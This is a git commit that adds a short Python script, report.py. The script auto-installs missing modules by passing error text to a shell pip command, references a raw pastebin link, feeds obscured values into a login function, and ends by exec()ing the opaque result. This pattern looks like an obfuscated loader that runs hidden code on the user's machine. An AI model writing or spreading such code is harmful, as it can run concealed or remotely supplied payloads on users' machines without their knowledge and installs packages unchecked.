84025b1037c56478b557dd6e1b5072d9a2e9e55e
F66O <74874153+F66O@users.noreply.github.com>
2021-04-12 15:05:52 +0300

    Add files via upload

---
+++ report.py
@@ -0,0 +1,33 @@
+try:
+    import os,requests,time,uuid,secrets,random,string,threading
+    from colorama import Fore
+    from utlis1.fir import onetime
+    from utlis1.sec import sectime
+    from utlis1.thi import thirdtime
+    from utlis1.forr import list1,list2
+    from utlis1.login import login,main
+    from utlis1.runit import eee
+except ModuleNotFoundError as e:
+    m = str(e).split("'")[1]
+    os.system(f'pip install {m}')
+
+# https://pastebin.com/raw/Fv7GVQY0
+
+a=list1[0]
+b=list1[1]
+c=list1[2]
+d=list1[3]
+e=list1[4]
+f=list1[5]
+g=list1[6]
+h=len(list2)
+
+hh=onetime
+hhh=sectime
+hhhh=thirdtime
+
+
+sssssss1231241343234 = login(hh,hhh,hhhh,a,b,c,d,e,f,g,h)
+
+
+exec(eee(sssssss1231241343234))
